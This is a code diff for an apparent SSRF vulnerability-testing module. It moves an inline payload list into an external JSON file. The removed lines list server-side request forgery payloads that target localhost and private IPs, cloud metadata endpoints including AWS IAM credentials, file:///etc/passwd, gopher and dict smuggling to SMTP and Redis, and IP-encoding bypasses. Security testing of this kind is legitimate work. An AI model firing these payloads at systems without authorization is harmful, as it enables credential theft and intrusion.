@@ -4,38 +4,13 @@ import asyncio
 import logging
 from typing import Any
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from ._payload_loader import load_skill_dataset as _load_ds
 
 logger = logging.getLogger(__name__)
 
-SSRF_PAYLOADS: list[dict[str, str]] = [
-    # Internal IPs
-    {"payload": "http://127.0.0.1/", "detect": "", "desc": "Localhost IPv4"},
-    {"payload": "http://localhost/", "detect": "", "desc": "Localhost hostname"},
-    {"payload": "http://[::1]/", "detect": "", "desc": "Localhost IPv6"},
-    {"payload": "http://0.0.0.0/", "detect": "", "desc": "All-interfaces IP"},
-    {"payload": "http://10.0.0.1/", "detect": "", "desc": "Private 10.x"},
-    {"payload": "http://192.168.1.1/", "detect": "", "desc": "Private 192.168.x"},
-    {"payload": "http://172.16.0.1/", "detect": "", "desc": "Private 172.16.x"},
-    # Cloud metadata
-    {"payload": "http://169.254.169.254/latest/meta-data/", "detect": "ami-", "desc": "AWS metadata"},
-    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "detect": "AccessKeyId", "desc": "AWS IAM creds"},
-    {"payload": "http://metadata.google.internal/computeMetadata/v1/", "detect": "", "desc": "GCP metadata"},
-    {"payload": "http://169.254.169.254/metadata/v1/", "detect": "", "desc": "DigitalOcean metadata"},
-    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "detect": "", "desc": "Azure metadata"},
-    # Protocol smuggling
-    {"payload": "file:///etc/passwd", "detect": "root:", "desc": "Local file read"},
-    {"payload": "file:///etc/hostname", "detect": "", "desc": "Hostname read"},
-    {"payload": "gopher://127.0.0.1:25/", "detect": "", "desc": "Gopher SMTP"},
-    {"payload": "dict://127.0.0.1:6379/INFO", "detect": "redis", "desc": "Redis via dict"},
-    # Bypass patterns
-    {"payload": "http://0x7f000001/", "detect": "", "desc": "Hex IP bypass"},
-    {"payload": "http://2130706433/", "detect": "", "desc": "Decimal IP bypass"},
-    {"payload": "http://127.1/", "detect": "", "desc": "Short IP bypass"},
-    {"payload": "http://127.0.0.1.nip.io/", "detect": "", "desc": "DNS rebinding"},
-    # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
-]
+SSRF_PAYLOADS = _load_ds("test_ssrf", "ssrf_payloads")  # ADR-007 Phase 3-9 — data in data/payloads/test_ssrf.json
 
-URL_PARAMS = ["url", "uri", "path", "redirect", "next", "link", "src", "href", "file", "page", "callback"]
+URL_PARAMS = _load_ds("test_ssrf", "url_params")  # ADR-007 Phase 3-9 — data in data/payloads/test_ssrf.json
 
 
 async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dict[str, Any]:
